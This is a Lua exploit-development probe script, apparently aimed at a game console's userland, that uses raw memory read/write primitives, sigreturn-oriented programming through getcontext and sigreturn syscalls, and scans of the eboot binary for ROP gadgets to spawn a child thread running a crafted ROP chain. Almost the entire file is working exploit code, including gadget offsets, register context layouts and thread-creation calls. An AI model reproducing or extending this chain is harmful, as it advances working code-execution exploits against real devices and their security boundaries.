-- CRASH_CLASS: LOW
-- PROBE 185f: Child thread getpid v3 — use known gadget offsets
--
-- Prior probes found: mov [rdi],rax;ret at eboot+0x92C67 and eboot+0xD0B60
-- jmp $ found at ~0x15480 relative to eboot text
-- This version jumps directly to those known offsets and verifies

print("=== 185f: CHILD GETPID v3 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc=" .. hex64(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local _, gpu = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
print("eb=0x" .. string.format("%X%08X", eb_hi, eb_lo))

-- Known offsets from prior probes:
-- mov [rdi],rax;ret (48 89 07 C3): eboot+0x92C67
-- jmp $ (EB FE): scan from ~0x10000

-- Verify mov gadget at known offset
local mov_off = 0x92C67
local ok, dw = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + mov_off))) end)
local mov_g = nil
if ok then
    local v = to_num(dw)
    print("@0x92C67: 0x" .. string.format("%08X", v))
    if v == 0xC3078948 then
        mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + mov_off))
        print("mov OK @0x92C67")
    end
end

-- Try second known offset
if not mov_g then
    mov_off = 0xD0B60
    ok, dw = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + mov_off))) end)
    if ok then
        local v = to_num(dw)
        print("@0xD0B60: 0x" .. string.format("%08X", v))
        if v == 0xC3078948 then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + mov_off))
            print("mov OK @0xD0B60")
        end
    end
end

-- If neither worked, scan from 0x80000 to 0x100000
if not mov_g then
    print("scanning 0x80000-0x100000 for mov...")
    for off = 0x80000, 0x100000, 4 do
        local ok2, dw2 = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
        if not ok2 then break end
        if to_num(dw2) == 0xC3078948 then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("mov @0x" .. string.format("%X", off))
            break
        end
    end
end

-- Find jmp $ — scan from 0x10000 to 0x20000 first
local jmp_g = nil
for off = 0x10000, 0x30000, 4 do
    local ok2, dw2 = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
    if not ok2 then break end
    local v = to_num(dw2)
    if (v % 0x10000) == 0xFEEB then
        jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
        print("jmp @0x" .. string.format("%X", off))
        break
    end
    if math.floor(v / 0x10000) % 0x10000 == 0xFEEB then
        jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 2))
        print("jmp @0x" .. string.format("%X", off + 2))
        break
    end
end

-- Extend jmp search if needed
if not jmp_g then
    print("extending jmp scan 0x30000-0x80000...")
    for off = 0x30000, 0x80000, 4 do
        local ok2, dw2 = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
        if not ok2 then break end
        local v = to_num(dw2)
        if (v % 0x10000) == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("jmp @0x" .. string.format("%X", off))
            break
        end
        if math.floor(v / 0x10000) % 0x10000 == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 2))
            print("jmp @0x" .. string.format("%X", off + 2))
            break
        end
    end
end

if not mov_g then print("NO MOV GADGET") return end
if not jmp_g then print("NO JMP GADGET") return end

-- === Child thread: syscall(getpid) then mov [rdi], rax; ret -> jmp $ ===
print("")
print("--- CHILD GETPID ---")

local MARKER = 0x10000
wq(gpu + MARKER, uint64(0))

local ST = 0x20000 - 16
wq(gpu + ST, mov_g)
wq(gpu + ST + 8, jmp_g)

local TC = 0x30000
for i = 0, 0x4FF, 8 do wq(gpu + TC + i, uint64(0)) end
wq(gpu + TC + 0x108, uint64(0x480))
wd(gpu + TC + 0x0D0, 0)
wq(gpu + TC + 0x110, uint64(0x10000))
wd(gpu + TC + 0x0C0, 0x43)
wd(gpu + TC + 0x100, 0x3B)
wq(gpu + TC + 0x0E0, sc_addr)     -- RIP = syscall;ret
wq(gpu + TC + 0x0F8, ga(ST))      -- RSP
wq(gpu + TC + 0x048, ga(MARKER))  -- RDI = marker address
wq(gpu + TC + 0x078, uint64(20))  -- RAX = getpid

local tb = memory.alloc(8)
wd(tb, 0)
local rv = srop(430, ga(TC), uint64(tb))
local cr = rv and to_num(rv) or -999
local ct = rd(tb)
print("create=" .. cr .. " tid=0x" .. string.format("%X", ct))

-- Wait 200ms
local TS = 0x38000
wq(gpu + TS, uint64(0))
wq(gpu + TS + 8, uint64(200000000))
srop(240, ga(TS), uint64(0))

local m = rq(gpu + MARKER)
local mval = to_num(m)
print("marker=" .. hex64(m) .. " (" .. mval .. ")")
print("pid=" .. pid)

if mval == pid then
    print("!!! CHILD GETPID MATCHES — CHILD SYSCALLS WORK !!!")
elseif mval > 0 then
    print("child wrote " .. mval .. " (nonzero but not pid)")
else
    print("marker still zero")
end

if ct > 0 then
    rv = srop(431, uint64(ct), uint64(0))
    print("alive=" .. (rv and to_num(rv) or -999))
end

-- === Test 2: child SROP — child does getcontext+sigreturn for getpid ===
print("")
print("--- CHILD SROP GETPID ---")

local MARKER2 = 0x11000
wq(gpu + MARKER2, uint64(0))

-- Child will:
-- 1. syscall(421, child_ctx) [getcontext] → ret to step2_gadget
-- 2. After getcontext returns, RIP is at mov_g which writes RAX to [RDI]
--    But we need to modify the context and call sigreturn...
-- Too complex for a simple chain. Let's confirm basic works first.

print("(deferred until basic chain confirmed)")

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
